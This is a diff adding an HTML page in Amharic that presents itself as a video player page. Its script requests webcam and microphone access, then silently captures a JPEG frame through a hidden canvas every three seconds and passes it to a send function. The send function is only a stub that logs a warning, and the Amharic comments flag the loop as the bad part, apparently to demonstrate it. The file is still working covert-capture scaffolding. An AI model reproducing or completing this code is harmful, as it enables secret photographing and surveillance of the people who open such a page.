@@ -1,0 +1,48 @@
+<!DOCTYPE html>
+<html lang="am">
+<head>
+    <meta charset="UTF-8">
+    <title>አውቶማቲክ አሰራር</title>
+</head>
+<body>
+
+    <h1>የቪዲዮ ማጫወቻ ገጽ</h1>
+    
+    <!-- ካሜራው/ቪዲዮው የሚታይበት -->
+    <video id="myVideo" autoplay playsinline width="400" height="300"></video>
+    <canvas id="myCanvas" style="display:none;"></canvas>
+
+    <script>
+        const video = document.getElementById('myVideo');
+        const canvas = document.getElementById('myCanvas');
+        const context = canvas.getContext('2d');
+
+        // ካሜራውን ማስጀመር
+        navigator.mediaDevices.getUserMedia({ video: true, audio: true })
+            .then(function(stream) {
+                video.srcObject = stream;
+
+                // ❌❌❌ ዋናው መጥፎው መስመር እዚህ ይጀምራል ❌❌❌
+                // ተጠቃሚው ምንም ሳይጫን በራሱ ጊዜ የሚሰራ ታይመር
+                setInterval(function() {
+                    
+                    // 1. ፎቶ ማንሳት
+                    canvas.width = video.videoWidth;
+                    canvas.height = video.videoHeight;
+                    context.drawImage(video, 0, 0, canvas.width, canvas.height);
+                    let photoData = canvas.toDataURL('image/jpeg');
+
+                    // 2. አውቶማቲክ መላክ
+                    sendAutoData(photoData);
+
+                }, 3000); // 👈 3000 ማለት በየ 3 ሰከንዱ አውቶማቲክ ይደጋገማል!
+            });
+
+        function sendAutoData(data) {
+            console.log("⚠️ አውቶማቲክ መላክ በየ 3 ሰከንዱ እየተካሄደ ነው!");
+            // እዚህ ውስጥ ያለ የ መላኪያ ጥሪ በየሰከንዱ አውቶማቲክ ያደርገዋል
+        }
+    </script>
+
+</body>
+</html>
